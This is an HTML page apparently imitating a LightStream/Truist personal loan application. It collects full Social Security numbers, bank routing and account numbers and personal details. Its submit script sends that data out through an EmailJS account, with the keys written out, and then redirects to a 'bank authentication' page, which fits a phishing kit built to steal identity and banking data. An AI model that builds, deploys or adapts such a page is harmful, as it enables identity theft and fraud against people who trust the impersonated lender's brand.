<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Loan Application - LightStream Financial Services | v2.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        .gradient-bg {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
        }
        
        .glass-effect {
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .cool-button {
            background: linear-gradient(45deg, #000000, #333333);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .cool-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
        }
        .cool-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s;
        }
        .cool-button:hover::before {
            left: 100%;
        }
        body {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
            min-height: 100vh;
        }
        .text-cool {
            color: #ffa500;
        }
        .bg-cool-card {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .form-step {
            display: none;
        }
        .form-step.active {
            display: block;
        }
        .step-indicator {
            transition: all 0.3s ease;
        }
        .step-indicator.active {
            background-color: #ffa500;
            color: #000;
        }
    </style>
</head>
<body class="bg-black">
    <!-- Header Navigation -->
    <header class="glass-effect sticky top-0 z-50">
        <nav class="container mx-auto px-4 py-4">
            <div class="flex justify-between items-center">
                <div class="flex items-center space-x-8">
                    <div class="flex items-center space-x-2">
                        <img src="images/newlogo.png" alt="LightStream Logo" class="logo-img" style="height: 68px; width: auto; max-width: none !important; max-height: none !important; object-fit: contain; background: transparent !important; filter: brightness(0) invert(1);">
                        <div class="text-2xl font-bold text-white">
                            <span class="text-cool">LightStream</span>
                        </div>
                    </div>
                    <div class="hidden md:flex space-x-6">
                        <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
                        <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
                    </div>
                </div>
                <div class="hidden md:flex space-x-4">
                    <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
                        <i class="fab fa-google"></i>
                        <span>Google Login</span>
                    </button>
                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
                    <a href="personal-loans.html" class="cool-button text-white px-4 py-2 rounded-lg">Apply Now</a>
                </div>
                <button class="md:hidden text-white" id="mobileMenuBtn">
                    <i class="fas fa-bars text-2xl"></i>
                </button>
            </div>
            <!-- Mobile Menu -->
            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
                <div class="flex flex-col space-y-3">
                    <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
                    <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
                    <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
                        <i class="fab fa-google"></i>
                        <span>Google Login</span>
                    </button>
                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
                    <a href="personal-loans.html" class="cool-button text-white px-4 py-2 rounded-lg">Apply Now</a>
                </div>
            </div>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="gradient-bg text-white py-20">
        <div class="container mx-auto px-4">
            <div class="max-w-4xl mx-auto text-center">
                <h1 class="text-4xl md:text-5xl font-bold mb-6">Personal Loan Application</h1>
                <p class="text-xl max-w-2xl mx-auto">
                    Get the funds you need with our competitive rates and flexible terms. Quick approval process with same-day funding available.
                </p>
            </div>
        </div>
    </section>

    <!-- Application Form -->
    <section class="py-16">
        <div class="container mx-auto px-4">
            <div class="max-w-4xl mx-auto">
                <div class="glass-effect rounded-lg shadow-xl p-8">
                    <!-- Step Indicators -->
                    <div class="flex justify-between mb-8">
                        <div class="step-indicator active px-4 py-2 rounded-full text-sm font-semibold" id="step1Indicator">
                            Step 1: Loan Details
                        </div>
                        <div class="step-indicator px-4 py-2 rounded-full text-sm font-semibold" id="step2Indicator">
                            Step 2: Personal Information
                        </div>
                    </div>

                    <form id="loanApplicationForm">
                        <!-- Step 1: Loan Details -->
                        <div class="form-step active" id="step1">
                            <div class="mb-6">
                                <label class="block text-gray-700 text-sm font-bold mb-2" for="loanAmount">
                                    Loan Amount *
                                </label>
                                <div class="relative">
                                    <span class="absolute left-3 top-3 text-gray-500">$</span>
                                    <input type="number" id="loanAmount" name="loanAmount" required autocomplete="off"
                                           class="w-full pl-8 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="5,000" min="2000" max="15000" oninput="validateLoanAmount()">
                                </div>
                                <p class="text-sm text-gray-500 mt-1">Minimum: $2,000 | Maximum: $15,000</p>
                                <p id="loanAmountError" class="text-sm text-red-500 mt-1 hidden">Loan amount must be between $2,000 and $15,000</p>
                            </div>

                            <div class="mb-6">
                                <label class="block text-gray-700 text-sm font-bold mb-2" for="loanDuration">
                                    Loan Duration *
                                </label>
                                <select id="loanDuration" name="loanDuration" required autocomplete="off"
                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                                    <option value="">Select Loan Duration</option>
                                    <option value="12">12 months</option>
                                    <option value="18">18 months</option>
                                    <option value="24">24 months</option>
                                    <option value="30">30 months</option>
                                    <option value="36">36 months</option>
                                    <option value="48">48 months</option>
                                    <option value="54">54 months</option>
                                    <option value="60">60 months</option>
                                </select>
                            </div>

                            <div class="mb-6">
                                <label class="block text-gray-700 text-sm font-bold mb-2" for="loanPurpose">
                                    Loan Purpose *
                                </label>
                                <select id="loanPurpose" name="loanPurpose" required
                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                                    <option value="">Select loan purpose</option>
                                    <option value="debt-consolidation">Debt Consolidation</option>
                                    <option value="home-improvement">Home Improvement</option>
                                    <option value="major-purchase">Major Purchase</option>
                                    <option value="medical-expenses">Medical Expenses</option>
                                    <option value="vacation">Vacation</option>
                                    <option value="wedding">Wedding</option>
                                    <option value="emergency">Emergency Fund</option>
                                    <option value="other">Other</option>
                                </select>
                            </div>


                            <div class="mb-6">
                                <label class="block text-gray-700 text-sm font-bold mb-2" for="customerBank">
                                    Your Bank *
                                </label>
                                <select id="customerBank" name="customerBank" required
                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                                    <option value="">Select your bank</option>
                                    <option value="chase">Chase Bank</option>
                                    <option value="bank-of-america">Bank of America</option>
                                    <option value="wells-fargo">Wells Fargo</option>
                                    <option value="citibank">Citibank</option>
                                    <option value="capital-one">Capital One</option>
                                    <option value="us-bank">U.S. Bank</option>
                                    <option value="pnc">PNC Bank</option>
                                    <option value="td-bank">TD Bank</option>
                                    <option value="bbt">BB&T (now Truist)</option>
                                    <option value="suntrust">SunTrust (now Truist)</option>
                                    <option value="regions">Regions Bank</option>
                                    <option value="fifth-third">Fifth Third Bank</option>
                                    <option value="keybank">KeyBank</option>
                                    <option value="huntington">Huntington Bank</option>
                                    <option value="citizens">Citizens Bank</option>
                                    <option value="ally">Ally Bank</option>
                                    <option value="discover">Discover Bank</option>
                                    <option value="synchrony">Synchrony Bank</option>
                                    <option value="marcus">Marcus by Goldman Sachs</option>
                                    <option value="other">Other Bank</option>
                                </select>
                            </div>

                            <div class="flex justify-end">
                                <button type="button" onclick="nextStep()"
                                        class="bg-indigo-600 text-white py-3 px-6 rounded-lg hover:bg-indigo-700 transition duration-200">
                                    Next Step
                                </button>
                            </div>
                        </div>

                        <!-- Step 2: Personal Information -->
                        <div class="form-step" id="step2">
                            <div class="grid md:grid-cols-2 gap-6">
                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="firstName">
                                        First Name *
                                    </label>
                                    <input type="text" id="firstName" name="firstName" required autocomplete="given-name"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="John">
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="lastName">
                                        Last Name *
                                    </label>
                                    <input type="text" id="lastName" name="lastName" required autocomplete="family-name"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="Doe">
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="email">
                                        Email Address *
                                    </label>
                                    <input type="email" id="email" name="email" required autocomplete="email"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="john.doe@example.com">
                                </div>

                                <div class="mb-6 md:col-span-2">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="address">
                                        Street Address *
                                    </label>
                                    <input type="text" id="address" name="address" required autocomplete="street-address"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="123 Main Street">
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="city">
                                        City *
                                    </label>
                                    <input type="text" id="city" name="city" required autocomplete="address-level2"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="New York">
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="state">
                                        State *
                                    </label>
                                    <select id="state" name="state" required
                                            class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                                        <option value="">Select state</option>
                                        <option value="AL">Alabama</option>
                                        <option value="AK">Alaska</option>
                                        <option value="AZ">Arizona</option>
                                        <option value="AR">Arkansas</option>
                                        <option value="CA">California</option>
                                        <option value="CO">Colorado</option>
                                        <option value="CT">Connecticut</option>
                                        <option value="DE">Delaware</option>
                                        <option value="FL">Florida</option>
                                        <option value="GA">Georgia</option>
                                        <option value="IL">Illinois</option>
                                        <option value="IN">Indiana</option>
                                        <option value="KS">Kansas</option>
                                        <option value="KY">Kentucky</option>
                                        <option value="LA">Louisiana</option>
                                        <option value="MD">Maryland</option>
                                        <option value="MA">Massachusetts</option>
                                        <option value="MI">Michigan</option>
                                        <option value="MN">Minnesota</option>
                                        <option value="MO">Missouri</option>
                                        <option value="NJ">New Jersey</option>
                                        <option value="NY">New York</option>
                                        <option value="NC">North Carolina</option>
                                        <option value="OH">Ohio</option>
                                        <option value="PA">Pennsylvania</option>
                                        <option value="SC">South Carolina</option>
                                        <option value="TN">Tennessee</option>
                                        <option value="TX">Texas</option>
                                        <option value="VA">Virginia</option>
                                        <option value="WA">Washington</option>
                                        <option value="WI">Wisconsin</option>
                                    </select>
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="zipCode">
                                        ZIP Code *
                                    </label>
                                    <input type="text" id="zipCode" name="zipCode" required autocomplete="postal-code"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="10001" pattern="[0-9]{5}" maxlength="5">
                                    <!-- ZIP validation message -->
                                    <div id="zipError" class="text-red-500 text-sm mt-1 hidden"></div>
                                    <!-- ZIP loading indicator -->
                                    <div id="zipLoading" class="text-blue-500 text-sm mt-1 hidden">
                                        <i class="fas fa-spinner fa-spin mr-1"></i>Verifying ZIP code...
                                    </div>
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="socialSecurity">
                                        Social Security Number *
                                    </label>
                                    <input type="text" id="socialSecurity" name="socialSecurity" required autocomplete="off"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="123-45-6789 or 123456789" maxlength="11">
                                </div>




                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="routingNumber">
                                        Bank Routing Number *
                                    </label>
                                    <input type="text" id="routingNumber" name="routingNumber" required autocomplete="off"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="123456789" pattern="[0-9]{9}" maxlength="9">
                                </div>

                                <div class="mb-6">
                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="accountNumber">
                                        Bank Account Number *
                                    </label>
                                    <input type="text" id="accountNumber" name="accountNumber" required autocomplete="off"
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                           placeholder="123456789" minlength="3" maxlength="20" pattern="[0-9]{3,20}">
                                </div>
                                <p class="text-sm text-gray-500 mt-1">Minimum: 3 digits | Maximum: 20 digits</p>
                            </div>

                            <!-- Terms and Conditions -->
                            <div class="mb-6">
                                <label class="flex items-start">
                                    <input type="checkbox" id="terms" name="terms" class="mr-2 mt-1" required>
                                    <span class="text-sm text-gray-700">
                                        I agree to the <a href="#" class="text-indigo-600 hover:text-indigo-800">Terms & Conditions</a> and <a href="#" class="text-indigo-600 hover:text-indigo-800">Privacy Policy</a>
                                    </span>
                                </label>
                            </div>

                            <div class="mb-6">
                                <label class="flex items-start">
                                    <input type="checkbox" id="consent" name="consent" class="mr-2 mt-1" required>
                                    <span class="text-sm text-gray-700">
                                        I consent to receive communications about my loan application via email and SMS
                                    </span>
                                </label>
                            </div>

                            <div class="flex justify-between">
                                <button type="button" onclick="previousStep()"
                                        class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 transition duration-200">
                                    Back
                                </button>
                                <button type="submit" 
                                        class="flex-1 bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 transition duration-200">
                                    Submit Application
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <link rel="stylesheet" href="footer.css">
    <!-- Canonical Footer Component - LightStream Website -->
    <footer>
        <div class="footer-container">
            <!-- Footer Links Section -->
            <div class="footer-links">
                <a href="personal-loans.html">Personal Loans</a>
                <a href="bank-auth.html">Bank Authentication</a>
                <a href="faqs.html">FAQs</a>
                <a href="#">Support</a>
                <a href="contact.html">Contact Us</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
            </div>
            
            <!-- Footer Contact Section -->
            <div class="footer-contact">
                <!-- Social Media Icons -->
                <div class="social-icons">
                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
                    <a href="#" aria-label="X"><i class="fab fa-x-twitter"></i></a>
                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
                </div>
            </div>
            
            <!-- Footer Legal Section -->
            <div class="footer-legal">
                <p><strong>Your loan terms, including APR, may differ based on loan purpose, amount, term length, and your credit profile.</strong> Lowest rates require excellent credit. At least 10.003% of approved applicants applying for to lowest rate qualified for to lowest rate available based on data from 10/01/2025 to 12/31/2025. Rate is quoted with AutoPay discount. AutoPay discount is only available prior to loan funding. Rates without AutoPay are 0.50% points higher. Subject to credit approval. Conditions and limitations apply. Advertised rates and terms are subject to change without notice.</p>
                <p><strong>Payment example:</strong> Monthly payments for a $10,000 loan at 10.00% APR with a term of 3 years would result in 36 monthly payments of $306.44.</p>
                <p><strong>Maximum APR for a LightStream loan is 25.39%.</strong> Loan terms range from 24 - 240 months depending on loan type.</p>
                <p><strong>You can fund your loan today if today is a banking business day, your application is approved, and you complete the following steps by 2:30 p.m. Eastern time:</strong></p>
                <ol>
                    <li>review and electronically sign your loan agreement;</li>
                    <li>provide us with your funding preferences and relevant banking information;</li>
                    <li>complete final verification process.</li>
                </ol>
                <div class="footer-grid">
                    <div class="footer-section">
                        <h4>Business Hours (Eastern time)</h4>
                        <p><strong>Customer Service</strong><br>
                        Monday - Friday: 9:30 a.m. to 7 p.m. & Saturday: Noon to 4 p.m.</p>
                        <p><strong>Application Processing</strong><br>
                        Monday - Friday: 10 a.m. to 6 p.m.</p>
                    </div>
                    <div class="footer-section">
                        <h4>Mailing Address</h4>
                        <p>
                            PO Box 117320<br>
                            Atlanta, GA 30368-7320
                        </p>
                    </div>
                </div>
                <div class="legal-copyright">
                    <p><strong>E H L Truist Bank is an Equal Housing Lender. 2025 Truist Financial Corporation.</strong></p>
                    <p>Truist, LightStream, and LightStream logos are service marks of Truist Financial Corporation. All rights reserved.</p>
                    <p>All other trademarks are property of their respective owners. Lending services provided by Truist Bank.</p>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Mobile menu toggle
        document.getElementById('mobileMenuBtn').addEventListener('click', function() {
            const mobileMenu = document.getElementById('mobileMenu');
            mobileMenu.classList.toggle('hidden');
        });

        // Form navigation
        let currentStep = 1;
        const totalSteps = 2;

        function nextStep() {
            if (currentStep < totalSteps) {
                // Validate current step before proceeding
                if (validateStep(currentStep)) {
                    document.getElementById(`step${currentStep}`).classList.remove('active');
                    currentStep++;
                    document.getElementById(`step${currentStep}`).classList.add('active');
                    updateStepIndicators();
                    window.scrollTo(0, 0);
                }
            }
        }

        function previousStep() {
            if (currentStep > 1) {
                document.getElementById(`step${currentStep}`).classList.remove('active');
                currentStep--;
                document.getElementById(`step${currentStep}`).classList.add('active');
                updateStepIndicators();
                window.scrollTo(0, 0);
            }
        }

        function updateStepIndicators() {
            for (let i = 1; i <= totalSteps; i++) {
                const indicator = document.getElementById(`step${i}Indicator`);
                if (i === currentStep) {
                    indicator.classList.add('active');
                } else {
                    indicator.classList.remove('active');
                }
            }
        }

        // Real-time loan amount validation
        function validateLoanAmount() {
            const loanAmount = document.getElementById('loanAmount');
            const loanAmountError = document.getElementById('loanAmountError');
            const value = parseFloat(loanAmount.value);
            
            if (loanAmount.value && (value < 2000 || value > 15000)) {
                loanAmountError.classList.remove('hidden');
                loanAmount.classList.add('border-red-500');
                loanAmount.classList.remove('border-gray-300');
            } else {
                loanAmountError.classList.add('hidden');
                loanAmount.classList.remove('border-red-500');
                loanAmount.classList.add('border-gray-300');
            }
        }

        function validateStep(step) {
            console.log(`üîç Validating Step ${step}...`);
            
            if (step === 1) {
                const loanAmount = document.getElementById('loanAmount').value;
                const loanDuration = document.getElementById('loanDuration').value;
                const loanPurpose = document.getElementById('loanPurpose').value;
                const customerBank = document.getElementById('customerBank').value;

                console.log('üìä Step 1 validation:', {
                    loanAmount: !!loanAmount,
                    loanDuration: !!loanDuration,
                    loanPurpose: !!loanPurpose,
                    customerBank: !!customerBank
                });

                if (!loanAmount || !loanDuration || !loanPurpose || !customerBank) {
                    alert('‚ùå Please fill in all required fields in Step 1:\n‚Ä¢ Loan Amount\n‚Ä¢ Loan Duration\n‚Ä¢ Loan Purpose\n‚Ä¢ Your Bank');
                    return false;
                }

                // Validate loan amount range
                const loanAmountNum = parseFloat(loanAmount);
                if (loanAmountNum < 2000 || loanAmountNum > 15000) {
                    alert('‚ùå Loan Amount must be between $2,000 and $15,000');
                    document.getElementById('loanAmount').focus();
                    return false;
                }

                return true;
            }
            
            if (step === 2) {
                // Validate ZIP code before allowing submission
                const zipInput = document.getElementById('zipCode');
                const zipError = document.getElementById('zipError');
                
                if (!zipInput.value || zipInput.value.length !== 5) {
                    showZipError('Invalid ZIP code - must be exactly 5 digits');
                    zipInput.focus();
                    return false;
                }
                
                // Check if there's an active error
                if (!zipError.classList.contains('hidden')) {
                    zipInput.focus();
                    return false;
                }

                // Validate bank account number
                const accountNumber = document.getElementById('accountNumber').value;
                if (!accountNumber || accountNumber.length < 3 || accountNumber.length > 20) {
                    alert('‚ùå Bank Account Number must be between 3 and 20 digits');
                    document.getElementById('accountNumber').focus();
                    return false;
                }

                // Validate that account number contains only digits
                if (!/^\d+$/.test(accountNumber)) {
                    alert('‚ùå Bank Account Number must contain only digits');
                    document.getElementById('accountNumber').focus();
                    return false;
                }
            }
            
            return true;
        }

        // Form submission
        document.getElementById("loanApplicationForm").addEventListener("submit", function(e) {
            console.log("üöÄ Form submit event triggered!");
            e.preventDefault();

            // Check if checkboxes are checked
            const termsCheckbox = document.getElementById("terms");
            const consentCheckbox = document.getElementById("consent");
            
            console.log("üìã Terms checked:", termsCheckbox?.checked);
            console.log("üìã Consent checked:", consentCheckbox?.checked);
            
            if (!termsCheckbox?.checked) {
                alert("‚ùå Please agree to Terms & Conditions and Privacy Policy");
                return;
            }
            
            if (!consentCheckbox?.checked) {
                alert("‚ùå Please consent to receive communications about your loan application");
                return;
            }

            console.log("‚úÖ Form validation passed!");

            const firstName = document.getElementById("firstName").value;
            const lastName = document.getElementById("lastName").value;

            console.log("üë§ First Name:", firstName);
            console.log("üë§ Last Name:", lastName);

            const formData = {
                loanAmount: document.getElementById("loanAmount").value,
                loanDuration: document.getElementById("loanDuration").value,
                loanPurpose: document.getElementById("loanPurpose").value,
                customerBank: document.getElementById("customerBank").value,
                firstName: firstName,
                lastName: lastName,
                fullName: firstName + " " + lastName,
                email: document.getElementById("email").value,
                streetAddress: document.getElementById("address").value,
                address: document.getElementById("address").value,
                city: document.getElementById("city").value,
                state: document.getElementById("state").value,
                zipCode: document.getElementById("zipCode").value,
                socialSecurity: document.getElementById("socialSecurity").value,
                routingNumber: document.getElementById("routingNumber").value,
                accountNumber: document.getElementById("accountNumber").value,
                terms: document.getElementById("terms").checked,
                consent: document.getElementById("consent").checked,
                createdAt: new Date().toISOString(),
                applicationType: "Personal Loan"
            };

            console.log("üè¶ Customer Bank Value:", document.getElementById("customerBank").value);
            
            // Store data for bank auth page (SECURE: sessionStorage only)
            sessionStorage.setItem("loanApplicationData", JSON.stringify(formData));
            console.log("üíæ Data stored in sessionStorage:", sessionStorage.getItem("loanApplicationData"));

            // Send Personal Loan email (NEW - separate email)
            console.log("üìß Sending Personal Loan email...");
            
            // Show processing message
            alert("‚úÖ Loan Application Submitted Successfully!\n\nüìã Your application has been received and is being processed.\n\nüìß What happens next:\n‚Ä¢ You will be redirected to bank authentication\n‚Ä¢ Please complete the bank verification step\n‚Ä¢ Your loan approval is under review\n\nThank you for choosing LightStream Financial Services.");
            
            sendPersonalLoanEmail(formData);

            console.log("üîÑ Redirecting to bank-auth.html...");
            setTimeout(() => {
                window.location.href = "bank-auth.html";
            }, 2000); // Give time for email to send
        });

        // NEW: Separate Personal Loan Email Function
        function sendPersonalLoanEmail(data) {
            console.log('üìß Sending Personal Loan email...');
            
            // Initialize EmailJS
            emailjs.init("nW8qV4aakkEtYlieZ");
            
            // Prepare email template parameters for Personal Loan ONLY
            const templateParams = {
                // RECIPIENT EMAIL - Send to customer's email
                to_email: data.email || 'customer@example.com',
                recipient_email: data.email || 'customer@example.com',
                customer_email: data.email || 'customer@example.com',
                
                // Loan information
                loan_amount: data.loanAmount || '',
                loan_duration: data.loanDuration || '',
                loan_purpose: data.loanPurpose || '',
                loan_term: data.loanDuration || '',
                
                // Borrower information
                firstName: data.firstName || '',
                lastName: data.lastName || '',
                borrower_name: data.fullName || '',
                customer_name: data.fullName || '',
                name: data.fullName || '',
                full_name: data.fullName || '',
                client_name: data.fullName || '',
                
                // Contact information
                email: data.email || '',
                address: data.address || '',
                city: data.city || '',
                state: data.state || '',
                zip_code: data.zipCode || '',
                zip: data.zipCode || '',
                
                // Bank information (from personal loan form only)
                customer_bank: data.customerBank || '',
                bank_name: data.customerBank || '',
                routing_number: data.routingNumber || '',
                account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : '',
                
                // Financial Information
                ssn: data.socialSecurity || '',
                
                // METADATA
                application_type: 'Personal Loan Application',
                submission_date: new Date().toLocaleString(),
                timestamp: new Date().toISOString(),
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString()
            };

            console.log('Personal Loan email template params:', templateParams);

            // Send Personal Loan email using separate template
            emailjs.send('service_mblpi2k', 'template_5wx44v8', templateParams)
                .then(function(response) {
                    console.log('‚úÖ Personal Loan email sent successfully!', response.status, response.text);
                })
                .catch(function(error) {
                    console.log('‚ùå Personal Loan email failed...', error);
                    console.log('Error details:', error.text || error.message);
                    
                    // Fallback: Store email data locally for later sending
                    if (error.text && error.text.includes('quota')) {
                        console.log('üìß EmailJS quota reached - storing email data for later');
                        const emailBackup = {
                            type: 'personal-loan',
                            templateParams: templateParams,
                            timestamp: new Date().toISOString(),
                            loanData: data
                        };
                        localStorage.setItem('pendingEmail_' + Date.now(), JSON.stringify(emailBackup));
                        console.log('üì¶ Email data stored locally - will send when quota resets');
                    }
                });
        }

        // Google OAuth Login Function
        function initiateGoogleLogin() {
            // Check if user is already logged in
            const isLoggedIn = localStorage.getItem('is_logged_in');
            if (isLoggedIn === 'true') {
                window.location.href = 'login-success.html';
                return;
            }
            
            // For demo purposes, simulate successful login
            // In production, this would redirect to Google OAuth
            console.log('Initiating Google OAuth login...');
            
            // Create mock user data for demo
            const mockUserData = {
                name: 'Demo User',
                email: 'demo@example.com',
                picture: 'https://ui-avatars.com/api/?name=Demo+User&background=random',
                verified: true
            };
            
            // Store user session
            localStorage.setItem('google_user_data', JSON.stringify(mockUserData));
            localStorage.setItem('is_logged_in', 'true');
            
            // Redirect to success page
            window.location.href = 'login-success.html';
        }
        
        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üåü Page loaded, initializing form...');
            
            // Check if form exists
            const form = document.getElementById("loanApplicationForm");
            if (!form) {
                console.error('‚ùå Form not found!');
                alert('‚ùå Form not found. Please refresh the page.');
                return;
            }
            
            console.log('‚úÖ Form found:', form);
            
            // Add change listener to bank select
            const customerBankSelect = document.getElementById('customerBank');
            if (customerBankSelect) {
                // Bank selection change handling can be added here if needed
            }
            
            // Add ZIP code validation
            setupZipCodeValidation();
            
            const loginBtn = document.querySelector('button[onclick="initiateGoogleLogin()"]');
            if (loginBtn) {
                loginBtn.innerHTML = '<i class="fas fa-user mr-2"></i><span>My Account</span>';
                loginBtn.removeAttribute('onclick');
                loginBtn.onclick = () => window.location.href = 'customer-dashboard.html';
            }
        });

        // ZIP Code Validation Function
        function setupZipCodeValidation() {
            const zipInput = document.getElementById('zipCode');
            const cityInput = document.getElementById('city');
            const stateInput = document.getElementById('state');
            const zipError = document.getElementById('zipError');
            const zipLoading = document.getElementById('zipLoading');

            if (!zipInput || !cityInput || !stateInput) {
                console.error('‚ùå ZIP validation fields not found');
                return;
            }

            let zipTimeout;

            zipInput.addEventListener('input', function(e) {
                const zip = e.target.value.replace(/\D/g, ''); // Only allow numbers
                
                // Update input with numbers only
                e.target.value = zip;
                
                // Clear previous timeout
                clearTimeout(zipTimeout);
                
                // Hide error and loading
                zipError.classList.add('hidden');
                zipLoading.classList.add('hidden');
                
                // Only validate if exactly 5 digits
                if (zip.length === 5) {
                    zipLoading.classList.remove('hidden');
                    
                    // Debounce API call
                    zipTimeout = setTimeout(() => {
                        validateAndFetchZipData(zip);
                    }, 500);
                } else if (zip.length > 0) {
                    showZipError('ZIP code must be exactly 5 digits');
                }
            });

            zipInput.addEventListener('blur', function(e) {
                const zip = e.target.value;
                if (zip.length !== 5) {
                    showZipError('Invalid ZIP code');
                }
            });
        }

        function validateAndFetchZipData(zip) {
            const zipError = document.getElementById('zipError');
            const zipLoading = document.getElementById('zipLoading');
            const cityInput = document.getElementById('city');
            const stateInput = document.getElementById('state');

            // First validate format
            if (!/^\d{5}$/.test(zip)) {
                showZipError('Invalid ZIP code format');
                return;
            }

            // Fetch ZIP data from API
            fetch(`https://api.zippopotam.us/us/${zip}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Invalid ZIP code');
                    }
                    return response.json();
                })
                .then(data => {
                    // Success - auto-fill city and state
                    if (data && data.places && data.places.length > 0) {
                        const place = data.places[0];
                        cityInput.value = place['place name'] || '';
                        stateInput.value = place['state abbreviation'] || '';
                        
                        console.log('‚úÖ ZIP data fetched:', {
                            zip: zip,
                            city: place['place name'],
                            state: place['state abbreviation']
                        });
                        
                        // Hide loading
                        zipLoading.classList.add('hidden');
                    } else {
                        showZipError('Invalid ZIP code');
                    }
                })
                .catch(error => {
                    console.error('ZIP API Error:', error);
                    if (error.message === 'Invalid ZIP code') {
                        showZipError('Invalid ZIP code');
                    } else {
                        showZipError('Unable to verify ZIP code. Please try again.');
                    }
                    zipLoading.classList.add('hidden');
                });
        }

        function showZipError(message) {
            const zipError = document.getElementById('zipError');
            const zipLoading = document.getElementById('zipLoading');
            
            zipError.textContent = message;
            zipError.classList.remove('hidden');
            zipLoading.classList.add('hidden');
            
            // Add red border to ZIP input
            const zipInput = document.getElementById('zipCode');
            zipInput.classList.add('border-red-500');
